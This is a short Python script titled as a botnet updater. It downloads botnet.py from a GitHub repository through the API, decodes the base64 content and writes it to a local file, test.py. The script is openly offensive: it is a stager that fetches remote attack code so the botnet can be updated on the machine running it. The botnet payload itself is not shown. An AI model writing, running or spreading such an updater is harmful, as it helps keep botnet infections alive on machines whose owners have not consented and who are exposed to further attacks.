from requests import get
from base64 import decodebytes


def update_botnet():
	r    = get(f'https://api.github.com/repos/indrajith69/botnet/contents/botnet.py')
	req  = bytes(r.json()['content'],encoding='utf-8')
	data = decodebytes(req).decode('utf8')
	
	with open('test.py','w') as f:
		f.write(data)

update_botnet()